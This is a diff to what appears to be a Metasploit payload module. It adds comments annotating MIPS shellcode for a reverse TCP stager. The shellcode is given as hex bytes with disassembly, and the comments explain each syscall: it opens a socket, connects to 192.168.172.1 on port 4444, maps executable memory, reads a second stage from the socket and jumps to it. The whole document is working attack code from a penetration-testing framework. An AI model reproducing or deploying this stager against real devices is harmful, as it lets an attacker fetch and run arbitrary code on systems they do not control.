@@ -41,6 +41,7 @@ module MetasploitModule
             "\x21\xe5\xff\xfd" +  #  addi    a1,t7,-3
             "\x28\x06\xff\xff" +  #  slti    a2,zero,-1
             "\x24\x02\x10\x57" +  #  li  v0,4183
+            # socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
             "\x01\x01\x01\x0c" +  #  syscall 0x40404
             "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
             "\x16\x00\x00\x36" +  #  bnez    s0,0x4006bc <failed>
@@ -58,6 +59,7 @@ module MetasploitModule
             "\x24\x0c\xff\xef" +  #  li  t4,-17
             "\x01\x80\x30\x27" +  #  nor a2,t4,zero
             "\x24\x02\x10\x4a" +  #  li  v0,4170
+            # connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.172.1")}, 16)
             "\x01\x01\x01\x0c" +  #  syscall 0x40404
             "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
             "\x16\x00\x00\x25" +  #  bnez    s0,0x4006bc <failed>
@@ -74,6 +76,7 @@ module MetasploitModule
             "\xad\x60\xff\xff" +  #  sw  zero,-1(t3)
             "\xad\x62\xff\xfb" +  #  sw  v0,-5(t3)
             "\x24\x02\x0f\xfa" +  #  li  v0,4090
+            # mmap(0xffffffff, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
             "\x01\x01\x01\x0c" +  #  syscall 0x40404
             "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
             "\x16\x00\x00\x15" +  #  bnez    s0,0x4006bc <failed>
@@ -83,6 +86,7 @@ module MetasploitModule
             "\x24\x06\x10\x01" +  #  li  a2,4097
             "\x20\xc6\xff\xff" +  #  addi    a2,a2,-1
             "\x24\x02\x0f\xa3" +  #  li  v0,4003
+            # read(sockfd, addr, 4096)
             "\x01\x01\x01\x0c" +  #  syscall 0x40404
             "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
             "\x16\x00\x00\x0c" +  #  bnez    s0,0x4006bc <failed>
@@ -92,6 +96,7 @@ module MetasploitModule
             "\x01\x20\x48\x27" +  #  nor t1,t1,zero
             "\x01\x20\x30\x20" +  #  add a2,t1,zero
             "\x24\x02\x10\x33" +  #  li  v0,4147
+            # cacheflush(addr, nbytes, DCACHE)
             "\x01\x01\x01\x0c" +  #  syscall 0x40404
             "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
             "\x16\x00\x00\x03" +  #  bnez    s0,0x4006bc <failed>
@@ -101,6 +106,7 @@ module MetasploitModule
             # 4006bc <failed>:
             "\x24\x04\x00\x01" +	#  li	a0,1
             "\x24\x02\x0f\xa1" +	#  li	v0,4001
+            # exit(status)
             "\x01\x01\x01\x0c" +	#  syscall	0x40404
             "\x00\x20\x08\x25" +	#  move	at,at
             "\x00\x20\x08\x25"    #  move	at,at
